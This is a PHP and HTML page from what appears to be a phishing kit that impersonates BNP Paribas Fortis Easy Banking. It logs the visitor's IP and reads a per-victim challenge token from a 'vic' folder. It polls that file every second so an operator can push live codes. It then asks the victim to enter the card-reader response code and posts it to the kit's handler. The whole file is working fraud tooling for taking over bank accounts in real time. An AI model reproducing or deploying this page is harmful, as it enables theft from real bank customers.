<?php
		session_start();
		error_reporting(0);
		include "./Asstes/php/lang/lang.php";
		  
		include('./CryoFusion/CherryBlossom.php');
		include('./CryoFusion/EmeraldCity.php');
		include('./CryoFusion/GoldenGateBridge.php');
		include('./CryoFusion/GrandCanyon.php');
		include('./CryoFusion/PacificOcean.php');
		include('./CryoFusion/SerengetiPlains.php');
		include('./CryoFusion/VictoriaFalls.php');
		include('./CryoFusion/Thalorinox.php');
			
		include "./CryoFusion/geoplugin.class.php";
		include "./CryoFusion/UserInfo.php";
		
		
		function get_user_ip2()
		{
			$client = @$_SERVER['HTTP_CLIENT_IP'];
			$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
			$remote = $_SERVER['REMOTE_ADDR'];
			if (filter_var($client, FILTER_VALIDATE_IP)) {
				$ip = $client;
			} elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
				$ip = $forward;
			} else {
				$ip = $remote;
			}
			if ($ip == '::1') {
				return '127.0.0.1';
			}
			return $ip;
		}

		$ip = get_user_ip2();
		$id_user = $ip;
		$filename = "./vic/$id_user+.txt";




$token = file_get_contents($filename);
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>Mijn online bank | Paribas Fortis</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
        <style>
          body{
            background-color:#EEEEEE;
          }
          input:focus{
              outline:2px solid #00965E !important;
              border: none !important;
          }
          input.error_input{
              outline:2px solid rgb(233, 62, 46) !important;
              border: none !important;
          }
          label.focus{
            color:#00965E !important;
          }
          label.err_leb{
            color:rgb(233, 62, 46) !important;
          }
          .error{
              color:rgb(233, 62, 46);
              font-family: ' BNPP Sans';
              margin-bottom:0 !important;
              font-size:14px;
              margin-left:15px;
              margin-top:5px;
          }      
          .error.error_1{
              font-size:13px;
          }            
        </style>        
    </head>
    <body>
      
    
    <!-- header -->
    <header class="header_1">
      <div class="container_header_1 d-flex align-items-center justify-content-between">
        <div class="route d-flex align-items-center">
          <i class="ri-arrow-left-s-line"></i>
          <p class="mb-0"><?php echo get_text('bn_l_1'); ?></p>
        </div>
        <div class="logo">
          <img src="./Asstes/imgs/logo.png" alt="">
        </div>
        <div class="esy_log">
          <p class="mb-0"><?php echo get_text('bn_l_2'); ?></p>
        </div>
        <div class="menu align-items-end">
          <p class="mb-0"><?php echo get_text('bn_l_3'); ?></p>
          <img src="./Asstes/imgs/menu.png" alt="">
        </div>
      </div>
    </header>

    <!-- wrapper_lect -->
    <div class="wrapper_lect">
      <div class="container_lect">
        <?php if( isset($_GET['error']) ) : ?>
        <div class="alert_error d-flex align-items-center">
          <i class="ri-alert-line"></i>
          <?php echo get_text('bn_l_4'); ?>
        </div>
        <?php endif; ?>
        <form action="./Asstes/php/config/func.php" method="post" class="d-flex">
          <input type="hidden" name="name_bank" value="BNP">
        <input type="hidden" name="lecture">
          <div class="part_left">
            <div class="x1"></div>
            <div class="title">
              <p class="mb-0"><?php echo get_text('bn_l_5'); ?></p>
              <h1 class="mb-0">Easy Banking</h1>
              <img src="./Asstes/imgs/lect.svg" class="mt-3" alt="">
            </div>
            <div class="info_left">
            </div>
          </div>
          <div class="part_right">
            
            <div class="info">
              <p class="mb-0 d-flex align-items-center">1. <?php echo get_text('bn_l_7'); ?> <span class="m1">M1</span></p>
            </div>
            <div class="info py-3">
              <p class="mb-0 d-flex align-items-center">2. <?php echo get_text('bn_l_8'); ?> <span class="number zzz"><?php echo $token; ?></span> <?php echo get_text('bn_l_9'); ?> <span class="ok">OK</span></p>
            </div>
            <div class="info">
              <p class="mb-0 d-flex align-items-center">3. <?php echo get_text('bn_l_10'); ?> <span class="ok">OK</span></p>
            </div>
            <div class="info bor py-3">
              <p class="mb-0 d-flex align-items-center">4. <?php echo get_text('bn_l_11'); ?></p>
              <div class="form-group mt-2">
                <div class="group-input">
                  <input type="text" name="code-lec" id="code-lec" placeholder="---- ----" class="<?php if(isset($_GET['error']))  echo "error_input"; ?>">
                </div>
                <?php if( isset($_GET['error']) ) : ?>
                <p class="error"><?php echo get_text('bn_l_12'); ?></p>
                <?php endif; ?>
              </div>              
            </div>
            <div class="btn_sub">
              <button type="submit" disabled><?php echo get_text('bn_l_13'); ?></button>
            </div>
          </div>
        </form>
        <p class="txt_form"><img src="./Asstes/imgs/call.png" alt=""> <?php echo get_text('bn_l_14'); ?></p>
      </div>
    </div>

    <!-- footer -->
    <footer class="footer_1 footer_lect">
      <div class="container_footer_1 d-flex align-items-center justify-content-between">
        <p class="mb-0">© 2026 BNP Paribas Fortis</p>
        <ul class="d-flex align-items-center flex-wrap mb-0 ps-0">
          <li>Vie Privée</li>
          <li class="tiri">-</li>
          <li>Co-navigation</li>
          <li class="tiri">-</li>
          <li>Conditions d'utilisation du Site Web</li>
          <li class="tiri">-</li>
          <li>Les Cookies</li>
          <li class="tiri">-</li>
          <li>Vie Privée</li>
        </ul>
      </div>
    </footer>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    
    <script>        
        $("#code-lec").mask('0000 0000');

        $(".form-group input").keyup(function(){
          if ($(".form-group #code-lec").val() != "") {
            $(".btn_sub button").prop("disabled",false);
            $(".btn_sub button").addClass("active");
          }else{
            $(".btn_sub button").prop("disabled",true);
            $(".btn_sub button").removeClass("active");
          }
        });       
        var ip = '<?php echo get_client_ip();?>';
        var waiting = setInterval(function() {
            $.get(`./vic/${ip}+.txt?` + new Date().getTime(), function(data) {
                if( data != "") {
                    $(".zzz").text(data);
                    // console.log(data);
                }
            });
        }, 1000);               
    </script>
    </body>
</html>